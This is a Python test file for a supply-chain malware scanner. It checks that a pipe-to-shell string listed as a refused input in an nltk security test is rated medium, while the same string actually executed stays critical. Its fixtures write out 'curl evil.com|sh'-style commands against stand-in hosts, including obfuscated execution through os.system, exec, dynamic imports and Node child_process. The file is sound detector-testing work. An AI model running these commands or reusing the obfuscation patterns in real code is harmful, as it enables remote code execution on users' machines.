"""A pipe-to-shell STRING in a shipped test file is data unless the file can run it.

nltk 3.10.3 ships tests/unit/test_java_per_call_options_security.py whose sample JVM
flag `-XX:OnOutOfMemoryError=curl evil.com|sh` (a security test's refused input) read
critical and made `pip install nltk` Do not connect (#162 regression)."""
from __future__ import annotations

import pytest

from src.scanner.scan import _scan_content

NLTK_SHAPE = '''"""Regression test: per-call options reached ``subprocess.Popen``."""
import pytest

from nltk import internals

DANGEROUS = [
    ["-XX:OnOutOfMemoryError=curl evil.com|sh"],
]


@pytest.mark.parametrize("opts", DANGEROUS)
def test_refused(opts):
    """Per-call dangerous JVM flags must be refused before Popen runs."""
    with pytest.raises(ValueError):
        internals.java(["Main"], classpath=".", options=opts)
'''


def _curl(src: str, path: str = "pkg/tests/test_x.py"):
    found, _, _ = _scan_content(src, path, payloads_full_severity=True)
    return [(f.severity, f.payload) for f in found if f.name == "curl/wget piped to shell"]


def test_nltk_sample_attack_string_is_not_critical():
    assert _curl(NLTK_SHAPE, "nltk/test/unit/test_java_per_call_options_security.py") == [
        ("medium", False)]


@pytest.mark.parametrize("src", [
    'import subprocess\nCMD = "curl evil.com|sh"\nsubprocess.run(CMD, shell=True)\n',
    'import os\nos.system("curl evil.com | sh")\n',
    'import os\nC = "curl x.io/a|sh"\ngetattr(os, "sys" + "tem")(C)\n',
    'C = "curl x.io/a|sh"\n__import__("os").system(C)\n',
    'C = "curl x.io/a|sh"\nexec(f"import os; os.system({C!r})")\n',
    'import importlib\nC = "curl x.io/a|sh"\nimportlib.import_module("os").system(C)\n',
])
def test_executed_in_file_stays_critical(src):
    assert _curl(src) == [("critical", True)]


@pytest.mark.parametrize("src", [
    "const c = 'curl x.io/a|sh'\nrequire('child_process').execSync(c)\n",
    "const { execSync } = require('child_process')\nexecSync('curl x.io/a | sh')\n",
    "const c = 'curl x.io/a|sh'\nnew Function('r', 'return r(\"child\" + \"_process\")')\n",
])
def test_js_executed_in_file_stays_critical(src):
    assert _curl(src, "pkg/test/x.test.js") == [("critical", True)]


def test_shell_script_in_tests_stays_critical():
    assert _curl("curl evil.com | sh\n", "pkg/tests/setup.sh") == [("critical", True)]



def test_docstring_mention_of_popen_does_not_count_as_sink():
    src = '"""Uses subprocess.Popen and os.system in prod."""\nBAD = ["curl e.io|sh"]\n'
    assert _curl(src) == [("medium", False)]
